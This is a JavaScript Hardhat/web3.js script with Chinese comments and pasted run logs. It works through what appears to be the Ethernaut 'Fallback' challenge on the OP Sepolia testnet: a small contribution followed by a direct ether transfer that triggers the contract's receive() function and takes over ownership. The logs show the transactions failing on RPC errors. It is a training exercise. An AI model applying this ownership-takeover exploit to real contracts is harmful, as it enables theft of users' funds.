const hre = require("hardhat");
const { Web3 } = require('web3');
require("dotenv").config();

// 這是公用的測試網路，因此會限制一些功能，例如不能直接發送以太幣到合約地址
// const url = "https://sepolia.optimism.io"; 
const url = process.env.OP_SEPOLIA_RPC_URL_API_KEY;
const web3 = new Web3(url);
console.log('使用 Web3.js 已連接到 OP Sepolia 測試網！');

// Fallback 地址
const contractAddress = "0x9D4d923d509522D333BC1c65d36f1DD688F159e9"; 
console.log("目標 Fallback 合約地址:", contractAddress);

// 我這個駭客的帳戶地址
const myAccount = "0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6"
console.log("我的帳戶地址: ", myAccount);

// 合約 ABI
const contractABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "contribute",
    "outputs": [],
    "stateMutability": "payable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "contributions",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "getContribution",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "withdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "stateMutability": "payable",
    "type": "receive"
  }
];

// 使用 web3.js 創建合約實例
const fallback = new web3.eth.Contract(contractABI, contractAddress);


async function sendEtherToContribute() {
  // 發送交易，注意這裡最多只能發送小於 0.001 ether，合約規定的，否則會被退款
  // 然而經過 getContribution() 調查 owner 的貢獻值，竟然高達 1000 ether！
  // 所以從這個函數去改寫 owner 地址為我的地址，是不可能的 QQ
  // 僅能從 sendEtherDirectly() 函數去觸發合約 Fallback 的 receive() 改寫 owner 地址為我的地址
  await fallback.methods.contribute().send({
    from: myAccount,
    value: web3.utils.toWei("0.0015", "ether"), // 發送 0.0015 ether，若低於 0.001 ether 會被退款
    gas: 200000 // 設置 gas 限制
  })
  .then(receipt => {
    console.log("交易成功:", receipt);
    //到這裡應該會成功更新 contributions[myAccount]
  })
  .catch(error => {
    console.error("交易失敗:", error);
  });
}

async function sendEtherDirectly() {
  // 直接發送以太幣到合約地址
  // 注意，一定要先執行  sendEtherToContribute() 去更新 contributions[myAccount]，否則會被拒絕退款
  await web3.eth.sendTransaction({
    from: myAccount,
    to: contractAddress,
    value: web3.utils.toWei("0.0001", "ether"), // 發送 0.0001 ether
    gas: 200000
  })
  .then(receipt => {
    console.log("直接轉帳成功:", receipt);
  })
  .catch(error => {
    console.error("直接轉帳失敗:", error);
  });
}

async function main() {  
  // ================================================ 這段僅供示範參考，實際用不到
  // 使用 hre 取得工廠實例
  const Fallback_hre = await hre.ethers.getContractFactory("Fallback");
  // 連接到已部署的合約
  const fallback_hre = await Fallback_hre.attach(contractAddress);
  // 呼叫 owner 變數
  const owner = await fallback_hre.owner();
  console.log("Contract owner:", owner);
  // 0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f
  // ================================================
  
  
  // 呼叫 getContribution() 函數
  // const contribution = await fallback2.methods.getContribution()
  // console.log("My contribution:", contribution); 會顯示以下結果
  /* My contribution: {
  arguments: [],
  call: [Function: call],
  send: [Function: send],
  populateTransaction: [Function: populateTransaction],
  estimateGas: [Function: estimateGas],
  encodeABI: [Function: encodeABI],
  decodeData: [Function: decodeData],
  createAccessList: [Function: createAccessList]
  }*/
 
  // 呼叫 getContribution() 函數，查詢 owner 貢獻
  const contribution_owner = await fallback.methods.getContribution().call({
    from: owner
  });
  console.log("Owner 的貢獻:", web3.utils.fromWei(contribution_owner, "ether"), "ether");
  console.log("Owner 的貢獻:", contribution_owner, "wei");
  


  // 呼叫 getContribution() 函數，查詢 我的 貢獻
  const contribution_myAccount = await fallback.methods.getContribution().call({
    from: myAccount
  });
  console.log("我的貢獻:", web3.utils.fromWei(contribution_myAccount, "ether"), "ether");
  console.log("我的貢獻:", contribution_myAccount, "wei");

  // 呼叫 contribute() 函數，貢獻 0.0005 ether
  await sendEtherToContribute();

  // 再次呼叫 getContribution() 函數，查詢 我的 貢獻是否更新
  const contribution_myAccount_update = await fallback.methods.getContribution().call({
    from: myAccount
  });
  console.log("更新我的貢獻:", web3.utils.fromWei(contribution_myAccount_update, "ether"), "ether");
  console.log("更新我的貢獻:", contribution_myAccount_update, "wei");


  const abi = await fallback.abi;
  // console.log("合約 ABI:", contractABI);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});


//以上執行會出錯
/*
C:\VScodeProject\Web3\15_Fallback>npx hardhat run scripts/interact.js --network optimismSepolia
使用 Web3.js 已連接到 OP Sepolia 測試網！
目標 Fallback 合約地址: 0x9D4d923d509522D333BC1c65d36f1DD688F159e9
我的帳戶地址:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
Contract owner: 0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f
Owner 的貢獻: 1000 ether
Owner 的貢獻: 1000000000000000000000n wei
我的貢獻: 0 ether
我的貢獻: 0n wei
交易失敗: ResponseError: Returned error: rpc method is not whitelisted
    at HttpProvider.<anonymous> (C:\VScodeProject\Web3\15_Fallback\node_modules\web3-providers-http\src\index.ts:83:10)
    at Generator.next (<anonymous>)
    at fulfilled (C:\VScodeProject\Web3\15_Fallback\node_modules\web3-providers-http\lib\commonjs\index.js:21:58)
    at processTicksAndRejections (node:internal/process/task_queues:105:5) {
  cause: { code: -32601, message: 'rpc method is not whitelisted' },
  code: 100,
  data: undefined,
  statusCode: 403,
  request: undefined
}
更新我的貢獻: 0 ether
更新我的貢獻: 0n wei

C:\VScodeProject\Web3\15_Fallback>
C:\VScodeProject\Web3\15_Fallback>
C:\VScodeProject\Web3\15_Fallback>npx hardhat run scripts/interact.js --network optimismSepolia
使用 Web3.js 已連接到 OP Sepolia 測試網！
目標 Fallback 合約地址: 0x9D4d923d509522D333BC1c65d36f1DD688F159e9
我的帳戶地址:  0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6
Contract owner: 0x716747Fbc1FcE4c36F2B369F87aDB5D4580e807f
Owner 的貢獻: 1000 ether
Owner 的貢獻: 1000000000000000000000n wei
我的貢獻: 0 ether
我的貢獻: 0n wei
交易失敗: ResponseError: Returned error: Unsupported method: eth_sendTransaction. See available methods at https://docs.alchemy.com/alchemy/documentation/apis
    at HttpProvider.<anonymous> (C:\VScodeProject\Web3\15_Fallback\node_modules\web3-providers-http\src\index.ts:83:10)
    at Generator.next (<anonymous>)
    at fulfilled (C:\VScodeProject\Web3\15_Fallback\node_modules\web3-providers-http\lib\commonjs\index.js:21:58)
    at processTicksAndRejections (node:internal/process/task_queues:105:5) {
  cause: {
    code: -32600,
    message: 'Unsupported method: eth_sendTransaction. See available methods at https://docs.alchemy.com/alchemy/documentation/apis'
  },
  code: 100,
  data: undefined,
  statusCode: 400,
  request: undefined
}
更新我的貢獻: 0 ether
更新我的貢獻: 0n wei


*/


